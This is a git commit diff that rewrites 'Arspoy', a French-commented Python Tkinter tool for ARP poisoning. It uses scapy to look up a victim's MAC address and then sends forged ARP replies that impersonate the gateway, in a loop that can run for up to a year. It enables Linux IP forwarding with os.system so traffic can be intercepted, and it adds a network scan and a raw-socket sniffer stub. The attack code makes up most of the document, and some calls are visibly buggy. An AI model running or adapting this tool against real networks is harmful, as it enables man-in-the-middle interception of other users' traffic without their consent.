c3673d3110c24063857bc8a0f3d90b99844944d2
benjaminclld <caillardbenjamin@gmail.com>
2016-02-18 09:39:35 +0100

    Update Arspoy v3.py

--- Arspoy v3.py
+++ Arspoy v3.py
@@ -1,50 +1,21 @@
 #coding: utf8
 #Script d'ARPPoisonning
 #Auteur:Benjamin CAILLARD
-
 from Tkinter import *
+from threading import *
 from scapy.all import *
-import socket,os,time,threading
-V_endspoof = ""
-intfce = "eth0"
+import time,socket,os,sched,socket
 
-#Definition d'une classe pour l'interface
-class C_GUI(Frame):
-	#Lancement des commandes d'ARPPoisonning
-	def cmmdstp(self):
-		self.endwhl = "END"
-	def cmmdkillall(self):
-		adrsip = 1
-		V_nbaddrs = 0
-		macvtcs = []
-		macvtcs.append(0)
-		self.lstscn.insert(END,"MyList")
-		while adrsip < 10:
-			tmp = Macaddr(self.kall.get()+str(adrsip))
-			adrsip +=1
-			print str(tmp)
-			if tmp != "None":
-				macvtcs[0] +=1
-				macvtcs.append(str(tmp))
-				
-		for inserlb in macvtcs:
-			self.lstscn.insert(END, inserlb)
-	def cmmd(self):
-		self.endwhl = "NOTEND"
-		self.disp.set("Check en cours du routeur "+str(Macaddr(self.rtr.get())))
-		self.disp.set("Check en cours de la victime "+str(Macaddr(self.vtc.get())))
-		V_macvtc = Macaddr(self.vtc.get())
-		V_timer = timerspoof(self.date.get())
-		F_ipforw(self.rdbvar.get())
-		T_thread = C_thread()
-		T_thread.F_Go(V_timer[0],V_timer[1],self.vtc.get(),self.rtr.get(),V_macvtc,self).start()
-	#definition de l'interface et des widgets
-	def __init__(self,G_main, **kwargs):
-		Frame.__init__(self, G_main, **kwargs)	
-		self.pack(fill=BOTH)	
-		self.test = ""
+
+
+class GUI(Tk):
+	def __init__(self, **kwargs):
+		Tk.__init__(self, **kwargs)
+		#Parametre generaux
+		self.title("Arspoy")
+		self.geometry('720x450')
 		#Form1
-		self.lbldesc = Label(self, text="Logiciel d'ARPPoisonning, crée par Benjamin CAILLARD").grid(row=0,column=2,columnspan=5)
+		self.lbldesc = Label(self, text="\\\_A_R_S_P_O_Y_//").grid(row=0,column=2,columnspan=5)
 		self.lbl0 = Label(self, text="########################").grid(row=1,column=0,columnspan=2)
 		self.lbldparam = Label(self, text="Paramètres:").grid(row=2,column=0,columnspan=2)
 		self.lbl1 = Label(self, text="########################").grid(row=3,column=0,columnspan=2)
@@ -60,68 +31,97 @@ class C_GUI(Frame):
 		self.date = IntVar()			
 		self.inpdate = Entry(self, textvariable=self.date,width=30).grid(row=11,column=0,columnspan=2)
 		self.lbl5 = Label(self, text="########################").grid(row=12,column=0,columnspan=2)
-		self.lbl6 = Label(self, text="Activation IPForwarding").grid(row=13,column=0,columnspan=2)
+		self.lbl6 = Label(self, text="Activation IPForwarding (defaut : Activer)").grid(row=13,column=0,columnspan=2)
 		self.rdbvar = StringVar()
-		Radiobutton(self, text="Activer", variable=self.rdbvar, value="y").grid(row=14,column=0,columnspan=2)
-		Radiobutton(self, text="Désactiver", variable=self.rdbvar, value="n").grid(row=15,column=0,columnspan=2)
-		self.lbl3 = Label(self, text="|").grid(row=16,column=0,columnspan=2)
-		self.lbl4 = Label(self, text="\/").grid(row=17,column=0,columnspan=2)
-		#print self.test.get()
-		self.btncheck = Button(self, text='Lancer',command=self.cmmd).grid(row=18,column=0)
-		self.btnstp = Button(self, text='Stop',command=self.cmmdstp).grid(row=18,column=1)
-		self.disp = StringVar()			
-		self.inpdisp = Entry(self, textvariable=self.disp,width=30).grid(row=19,column=0,columnspan=2)
+		Radiobutton(self, text="Activer", variable=self.rdbvar, value="y").grid(row=14,column=0)
+		Radiobutton(self, text="Désactiver", variable=self.rdbvar, value="n").grid(row=14,column=1)
+		self.lbl3 = Label(self, text="|     |     |     |").grid(row=15,column=0,columnspan=2)
+		self.btncheck = Button(self, text='Lancer',command=self.go,height=1, width=10).grid(row=16,column=0,ipady=3)
+		self.btnstp = Button(self, text='Stop',command=self.stop,height=1, width=10).grid(row=16,column=1,ipady=3)
+		self.lbl8var = StringVar()
+		self.lbl8 = Label(self, textvariable =self.lbl8var).grid(row=18,column=0,columnspan=2,ipady=6)
+		self.lbl8var.set("")
 		#Form2
-		self.lbl4 = Label(self, text="Adresse réseau local").grid(row=2,column=3,columnspan=2)
+		self.lbl4 = Label(self, text="Adresse réseau local (10.0.0.0/24)").grid(row=2,column=3)
 		self.kall = StringVar()
-		self.inpkall = Entry(self, textvariable=self.kall,width=30).grid(row=3,column=3,columnspan=2)
-		self.kall.set("10.0.0.[laissez vide]")
-		self.btnkall = Button(self, text='Scan',command=self.cmmdkillall).grid(row=4,column=3,columnspan=2)
-		self.lstscn = Listbox(self, selectmode=EXTENDED).grid(row=5,column=3,rowspan=9,columnspan=2)
-#Class Threading
-class C_thread(threading.Thread):
-	def __init__(self):
-        	threading.Thread.__init__(self)
-	def F_Go(self,timer,timerend,V_targ,V_gateway,Mac_targ,self2):
-		while timer < timerend and self2.endwhl != "END":
-			#respreq =  threading.Thread(arpreq(V_targ,V_gateway,Mac_targ)).start()
-			respreq = arpreq(V_targ,V_gateway,Mac_targ)
-			self2.disp.set("Usurpation sur "+ V_targ)
+		self.inpkall = Entry(self, textvariable=self.go,width=40).grid(row=3,column=3)
+		self.btnkall = Button(self, text='Scan',command=self.scan,height=1, width=10).grid(row=4,column=3)
+		self.V_lstscn = StringVar()
+		self.lstscn = Listbox(self, listvariable=self.V_lstscn,width=40,height=15).grid(row=5,column=3,rowspan=10)
+		#Form3
+		#self.lbl4 = Label(self, text="Sniffeur de LAN").grid(row=2,column=4)
+		#self.V_lstsnff = StringVar()
+		#self.lstsnff = Listbox(self, listvariable=self.V_lstsnff,width=40,height=15).grid(row=3,column=4,rowspan=10)
+		#self.btnkall = Button(self, text='Sniffer',command=self.sniffing,height=1, width=10).grid(row=12,column=4)
+	def go(self):#fonction du bouton lancer
+		self.thread1 = Thread(target=self.cmmd)
+		self.thread1.start()
+	def sniffing(self):#ecoute du réseau (en test)
+		scksnff = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+		while True:
+			print scksnff.recvfrom(65565)
+	def scan(self):#scan du réseau (en test)
+		lstttl = ""
+		self.thread2 = Thread(self.Macaddrbroadcast(self.kall.get()))
+		#for i in self.thread2:
+		#	lstttl =  lstttl + self.thread2[i][1].hwsrv + "-" + self.thread2[i][1].psrc + " "
+		#self.V_lstscn.set(lstttl)
+	def stop(self):#stop l'arp poisonning
+		self.endwhl = "END"
+	def cmmd(self):#lancement des tâches
+		self.endwhl = "NOTEND"
+		self.V_macvtc = self.Macaddr(self.vtc.get())
+		self.lbl8var.set("Vérification de la victime : "+ str(self.V_macvtc))
+		self.V_timer = self.timerspoof(self.date.get())
+		#self.F_ipforw(self.rdbvar.get())
+		self.thread1 = Thread(target=self.F_Go(self.V_timer[1],self.vtc.get(),self.rtr.get(),self.V_macvtc))
+		self.thread1.start()
+	def F_Go(self,timerend,V_targ,V_gateway,Mac_targ):#boucle de l'arp poisonning
+		timer = time.time()
+		timi = self.date.get() - 1
+		V_timerdisp = timerend - timi
+		self.lbl8var.set("Usurpation sur "+ V_targ + " temps restant : "+ str(timi))
+		while timer < timerend:
+			respreq = self.arpreq(V_targ,V_gateway,Mac_targ)
+			print str(timer) + " "+str(timerend)
+			if self.endwhl == "END":
+				break
+			if timer > V_timerdisp:
+				timi -= 1
+				V_timerdisp = timerend - timi
+				self.lbl8var.set("Usurpation sur "+ V_targ + " temps restant : "+ str(timi))
 			timer = time.time()
-		F_ipforw("n")
-
-#Parametres generaux de l'interface
-def F_genmain(G_):
-		G_main.title("Arspoy")
-		G_main.geometry('600x400')
-#Recuperation de l'adresse MAC de X
-def Macaddr(ip):
-	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
-	for s,r in ans:
-		return r.sprintf("%Ether.src%")
-#Requete d'arp poisonning
-def arpreq(victim,usurp,mac):
-	respreq = send(ARP(op=2, pdst=victim, psrc=usurp, hwdst=mac))
-	return respreq
-def timerspoof(date):
-	timer = time.time()
-	timerend = time.time()+int(date)
-	return timer,timerend
-#Requete d'IPForwarding sur Linux
-def F_ipforw(check):
-	if check == "" or check == "y":
-		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-	elif check == "n":
-		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-	else:
-		print "Commande invalide"
-#Boucle de requete arp
-
-	
-
-G_main = Tk()
-F_genmain(G_main)
-GUI = C_GUI(G_main)
-
-GUI.mainloop()
-
+		self.F_ipforw("n")
+	def Macaddr(self,ip):#recuperation de l'adresse MAC
+		try:
+			ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
+			for s,r in ans:
+				return r.sprintf("%Ether.src%")
+		except:
+			self.lbl8var.set("Erreur l'adresse " + ip + " n'est pas disponible")
+			pass
+	def Macaddrbroadcast(self,ip):
+		ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
+		for s,r in ans:
+			print r.sprintf(r"%Ether.src% & %ARP.psrc%\\")
+		#ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
+		#return unans
+	def timerspoof(self,date):#delai d'arp poisonning
+		timer = time.time()
+		if date == "0":
+			timerend = time.time()+int(31536000) #1 an
+		else:
+			timerend = time.time()+int(date)
+		return timer,timerend
+	def F_ipforw(self,check): #Ipforwarding Linux
+		if check == "" or check == "y":
+			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+		elif check == "n":
+			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		else:
+			print "Commande invalide"
+	def arpreq(self,victim,usurp,mac):#requete arp poisonning
+		respreq = send(ARP(op=2, pdst=victim, psrc=usurp, hwdst=mac))
+		return respreq
+		
+GUI().mainloop()
